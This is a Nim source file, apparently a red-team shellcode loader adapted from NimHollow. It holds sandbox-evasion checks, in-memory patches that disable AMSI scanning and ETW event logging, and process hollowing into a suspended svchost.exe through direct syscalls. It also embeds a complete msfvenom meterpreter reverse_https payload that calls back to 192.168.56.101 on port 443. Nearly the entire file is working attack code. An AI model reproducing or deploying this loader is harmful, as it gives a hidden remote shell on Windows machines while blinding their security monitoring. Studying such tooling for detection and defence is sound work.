#[
    Credits https://github.com/snovvcrash/NimHollow
]#

import os
import times
import dynlib
import endians
import strformat
import winim
import nimcrypto
import random
#import strenc # add a bit more of obfuscation for embedded strings
import strformat

include syscalls
# use https://github.com/ajpc500/NimlineWhispers2
#[
    NtQueryInformationProcess
    NtReadVirtualMemory
    NtProtectVirtualMemory
    NtWriteVirtualMemory
    NtResumeThread
    NtClose 
]#

proc WeirdApi(): bool =
    let mem = VirtualAllocExNuma(
        GetCurrentProcess(),
        NULL,
        0x1000,
        0x3000,
        0x20,
        0
    )
    if isNil(mem):
        return false
    else:
        return true

proc SleepnCheck(): bool =
    randomize()
    let dreaming = rand(5000..10000)
    let delta = dreaming - 500
    let before = now()
    sleep(dreaming)
    if (now() - before).inMilliseconds < delta:
        return false
    return true


proc MetaSandbox(): bool =
    if SleepnCheck() == false:
        return false
    elif WeirdApi() == false:
        return false
    else:
        return true

proc Patchntdll(): bool =
    when defined amd64:
        echo "[*] Running in x64 process"
        const patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        echo "[*] Running in x86 process"
        const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled


proc PatchAmsi(): bool =
    when defined amd64:
        echo "[*] Running in x64 process"
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        echo "[*] Running in x86 process"
        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

proc hollowShellcode[byte](shellcode: openArray[byte]): void =
    let
        processImage: string = r"C:\Windows\System32\svchost.exe"
    var
        nBytes: SIZE_T
        tmp: ULONG
        res: WINBOOL
        baseAddressBytes: array[0..sizeof(PVOID), byte]
        data: array[0..0x200, byte]

    var ps: SECURITY_ATTRIBUTES
    var ts: SECURITY_ATTRIBUTES
    var si: STARTUPINFOEX
    var pi: PROCESS_INFORMATION

    res = CreateProcess(
        NULL,
        newWideCString(processImage),
        ps,
        ts, 
        FALSE,
        0x4, # CREATE_SUSPENDED
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi)

    if res == 0:
        echo fmt"[DEBUG] (CreateProcess) : Failed to start process from image {processImage}, exiting"
        return

    var hProcess = pi.hProcess
    var bi: PROCESS_BASIC_INFORMATION

    res = NtQueryInformationProcess(
        hProcess,
        0, # ProcessBasicInformation
        addr bi,
        cast[ULONG](sizeof(bi)),
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtQueryInformationProcess) : Failed to query created process, exiting"
        return

    var ptrImageBaseAddress = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10)

    res = NtReadVirtualMemory(
        hProcess,
        ptrImageBaseAddress,
        addr baseAddressBytes,
        sizeof(PVOID),
        addr nBytes)

    if res != 0:
        echo "[DEBUG] (NtReadVirtualMemory) : Failed to read image base address, exiting"
        return

    var imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))

    res = NtReadVirtualMemory(
        hProcess,
        imageBaseAddress,
        addr data,
        len(data),
        addr nBytes)

    if res != 0:
        echo "[DEBUG] (NtReadVirtualMemory) : Failed to read first 0x200 bytes of the PE structure, exiting"
        return

    var e_lfanew: uint
    littleEndian32(addr e_lfanew, addr data[0x3c])
    echo "[DEBUG] e_lfanew = ", e_lfanew

    var entrypointRvaOffset = e_lfanew + 0x28
    echo "[DEBUG] entrypointRvaOffset = ", entrypointRvaOffset

    var entrypointRva: uint
    littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
    echo "[DEBUG] entrypointRva = ", entrypointRva

    var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
    echo "[DEBUG] entrypointAddress = ", cast[uint64](entrypointAddress)

    var protectAddress = entrypointAddress
    var shellcodeLength = cast[SIZE_T](len(shellcode))
    var oldProtect: ULONG

    res = NtProtectVirtualMemory(
        hProcess,
        addr protectAddress,
        addr shellcodeLength,
        0x40, # PAGE_EXECUTE_READWRITE
        addr oldProtect)

    if res != 0:
        echo "[DEBUG] (NtProtectVirtualMemory) : Failed to change memory permissions at the EntryPoint, exiting"
        return

    res = NtWriteVirtualMemory(
        hProcess,
        entrypointAddress,
        unsafeAddr shellcode,
        len(shellcode),
        addr nBytes)

    if res != 0:
        echo "[DEBUG] (NtWriteVirtualMemory) : Failed to write the shellcode at the EntryPoint, exiting"
        return

    res = NtProtectVirtualMemory(
        hProcess,
        addr protectAddress,
        addr shellcodeLength,
        oldProtect,
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtProtectVirtualMemory) : Failed to revert memory permissions at the EntryPoint, exiting"
        return

    res = NtResumeThread(
        pi.hThread,
        addr tmp)

    if res != 0:
        echo "[DEBUG] (NtResumeThread) : Failed to resume thread, exiting"
        return

    res = NtClose(
        hProcess)


when defined(windows):

    when defined amd64:
        echo "[*] Running in x64 process"
        # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.101 LPORT=443 EXITFUNC=thread -f csharp
        var shellcode: array[680, byte] = [byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
        0x51,0x48,0x31,0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,
        0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48,
        0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0xe3,0x56,0x4d,0x31,0xc9,0x48,
        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
        0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
        0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
        0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
        0x41,0x58,0x5e,0x48,0x01,0xd0,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
        0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
        0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
        0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
        0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
        0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
        0xe8,0x0f,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x35,0x36,
        0x2e,0x31,0x30,0x31,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,
        0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,
        0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0x7d,0x00,0x00,0x00,0x2f,0x45,0x4f,0x75,
        0x72,0x59,0x54,0x50,0x47,0x42,0x44,0x70,0x7a,0x75,0x58,0x4b,0x37,0x45,0x6b,
        0x61,0x63,0x43,0x41,0x48,0x51,0x62,0x58,0x38,0x57,0x58,0x4e,0x74,0x38,0x55,
        0x79,0x75,0x75,0x62,0x4e,0x49,0x4d,0x36,0x51,0x6a,0x44,0x67,0x43,0x58,0x62,
        0x41,0x4d,0x53,0x73,0x78,0x6f,0x73,0x4c,0x51,0x30,0x55,0x5a,0x61,0x6f,0x50,
        0x43,0x56,0x56,0x39,0x46,0x30,0x58,0x36,0x6e,0x4c,0x4f,0x79,0x6d,0x5f,0x39,
        0x62,0x56,0x70,0x37,0x77,0x4b,0x6b,0x70,0x6f,0x72,0x43,0x4b,0x6b,0x6f,0x57,
        0x38,0x30,0x4c,0x4c,0x68,0x55,0x5f,0x37,0x6e,0x49,0x72,0x54,0x32,0x6a,0x55,
        0x6c,0x5f,0x6b,0x6c,0x41,0x77,0x64,0x6c,0x62,0x46,0x65,0x56,0x69,0x77,0x54,
        0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
        0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,
        0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,
        0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,
        0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,
        0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,
        0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,
        0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,
        0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,
        0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,
        0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,
        0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,
        0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,
        0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,
        0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,
        0x41,0x89,0xda,0xff,0xd5]
    elif defined i386:
        discard

    # This is essentially the equivalent of 'if __name__ == '__main__' in python
    when isMainModule:
        if MetaSandbox() == false:
            quit()
        var amsi_success = PatchAmsi()
        echo fmt"[*] AMSI disabled: {bool(amsi_success)}"
        var etw_success = Patchntdll()
        echo fmt"[*] ETW blocked by patch: {bool(etw_success)}"
        hollowShellcode(shellcode)
